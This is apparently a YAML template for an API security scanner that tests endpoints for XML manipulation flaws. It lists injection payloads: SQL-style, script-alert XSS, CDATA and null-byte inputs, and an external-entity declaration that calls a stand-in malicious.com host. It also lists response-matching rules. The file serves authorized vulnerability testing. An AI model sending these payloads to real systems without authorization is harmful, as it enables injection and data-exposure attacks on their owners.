@@ -1,0 +1,182 @@
+---
+id: MANIPULATING_XML
+info:
+  name: "Manipulating XML"
+  description: >
+    "Manipulating XML occurs when an attacker exploits the flexibility of XML data structure to introduce malicious tags, attributes, or nested elements. The aim is to alter the intended behavior of the application, inject harmful data, or create resource exhaustion scenarios."
+  details: >
+    "Attackers can inject or manipulate XML data in various ways, such as modifying XML tags, attributes, entities, or the overall structure of the document. This manipulation may affect the application's XML parsing, leading to privilege escalation, denial of service, or unintended data exposure. Common techniques include XML tag injection, XPath injection, and XML external entity (XXE) attacks."
+  impact: >
+    "XML manipulation can result in significant security vulnerabilities. If the application fails to properly sanitize or validate XML input, attackers may escalate privileges, expose sensitive information, perform unauthorized actions, or cause denial of service by submitting large or malformed XML payloads. These issues can compromise data integrity, confidentiality, and availability."
+
+  category:
+    name: INPUT
+    shortName: Input Validation
+    displayName: Input Validation (INPUT)
+  subCategory: MANIPULATING_XML
+  severity: LOW
+  tags:
+    - Business logic
+    - OWASP top 10
+    - HackerOne top 10
+    # check ref.
+  references:
+    - "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing"
+    - "https://www.akto.io/blog/xml-external-entity-attack"
+    - "https://www.akto.io/blog/xml-injection-vulnerability-examples-cheatsheet-and-prevention"
+  cwe:
+    - CWE-611
+    - CWE-827
+  cve:
+    - CVE-2022-42745
+
+api_selection_filters:
+  response_code:
+    gte: 200
+    lt: 300
+  response_payload:
+    length:
+      gt: 0
+    not_contains:
+      - Error
+      - Internal Server 
+      - Failed
+      - Unauthorized
+      - access denied
+      - Forbidden
+      - Method Not allowed
+      - Gateway timeout
+      - request timeout
+      - server error
+      - server busy
+      - authentication error
+      - authorization error
+      - validation error
+      - Permission Denied
+      - invalid token
+      - token expired
+      - session expired
+      - session timeout
+      - unexpected error
+      - unable to process request
+      - bad request
+      - service unavailable
+      - account is locked
+      - account is blocked
+      - multiple failed attempts
+  request_payload:
+    for_one:
+      key:
+        regex: .*
+        extract: userKey
+      value:
+        extract: userValue
+
+wordLists:
+  attemptValues:
+    # invalid XML characters
+    - <${userKey}>U+0000${userValue}U+0000</${userKey}>
+    - <${userKey}>U+007F${userValue}U+007F</${userKey}>
+    # Blind XML injection
+    - <${userKey}>' OR 1=1 -- -</${userKey}>
+    # XSS in XML
+    - <${userKey}><script>alert(document.domain)</script></${userKey}>
+    - <${userKey}><script>alert(1)</script></${userKey}>
+    # XML whitespace abuse
+    - <${userKey}>     ${userValue}        </${userKey}>
+    # mixed content injection
+    - <${userKey}>${userValue}<!--hello--></${userKey}>
+    # CDATA injection
+    - <${userKey}><![CDATA[<script>alert('Injected!');</script>]]></${userKey}>
+    - <${userKey}><![CDATA[${userValue}]]></${userKey}>
+    # namespace prefix manipulation
+    - <xsl:${userKey} xmlns:xsl="http://www.w3.org/1999/XSL/Transform">${userValue}</xsl:${userKey}>
+    # duplicate XML injection
+    - <${userKey}>${userValue}</${userKey}><${userKey}>${userValue}</${userKey}>
+    # overlapping elements injection
+    - <${userKey}><randomTag><${userKey}>${userValue}</randomTag></${userKey}>
+    - <${userKey}><randomTag><${userKey}>${userValue}</${userKey}></randomTag>
+    # improper encoding injection
+    - "<${userKey}>&#x3C;script&#x3E;alert('Injected')&#x3C;/script&#x3E;</${userKey}>"
+    # null byte injection
+    - <${userKey}>\0\0\0\0${userValue}</${userKey}>
+    # hybrid injection
+    - "<${userKey}>{\"${userKey}\":\"${userValue}\"}</${userKey}>"
+    # conditional code injection
+    - "<!--[if gte IE 9]><${userKey}>${userValue}</${userKey}><![endif]-->"
+    # data type manipulation
+    - <${userKey} xsi:type="xsd:double">${userValue}</${userKey}>
+    - <${userKey} xsi:type="xsd:decimal">${userValue}</${userKey}>
+    # malformed XML
+    - <${userKey}><hello
+    # XML schema injection
+    - <xsd:schema xmlns:xsd=""http://www.w3.org/2001/XMLSchema""><xsd:element name=""malicious"" type=""xsd:string""/></xsd:schema><${userKey}>${userValue}</${userKey}>
+    - <?xml version="1.0"?><!DOCTYPE root [<!ENTITY % customSchema SYSTEM "http://malicious.com/maliciousSchema.xsd">%customSchema;]><${userKey}>${userValue}</${userKey}>
+    # doctype declaration abuse
+    - <!DOCTYPE data [<!ELEMENT name ANY>]><${userKey}>${userValue}</${userKey}>
+
+execute:
+  type: single
+  requests:
+    - req:
+        - replace_body: ${attemptValues}
+        - modify_header:
+            content-type: "application/xml"
+
+validate:
+  response_code:
+    gte: 200
+    lt: 300
+  response_payload:
+    length:
+      gt: 0
+    # we are expecting the payloads to be different.
+    percentage_match:
+      lt: 10
+    not_contains:
+      - Error
+      - Internal Server 
+      - Failed
+      - Unauthorized
+      - access denied
+      - Forbidden
+      - Method Not allowed
+      - Gateway timeout
+      - request timeout
+      - server error
+      - server busy
+      - authentication error
+      - authorization error
+      - validation error
+      - Permission Denied
+      - invalid token
+      - token expired
+      - session expired
+      - session timeout
+      - unexpected error
+      - unable to process request
+      - bad request
+      - service unavailable
+      - account is locked
+      - account is blocked
+      - multiple failed attempts
+      - Attention Required!
+      - CloudFlare
+      - Sorry, you have been blocked
+      - "400 Bad Request"
+      - "403 Forbidden"
+      - "500 Internal Server Error"
+      - "502 Bad Gateway"
+      - "503 Service Unavailable"
+      - "422 Unprocessable Entity"
+      - "504 Gateway Timeout"
+      - "XML Parsing Error: mismatched tag"
+      - "XML Parsing Error: invalid character"
+      - "XML Validation Error: schema validation failed"
+      - "XML Parsing Error: unexpected end of file"
+      - "DTD is prohibited"
+      - "XML External Entity (XXE) Reference Error"
+      - "Error: Invalid CDATA section"
+      - "Malformed XML request"
+
+
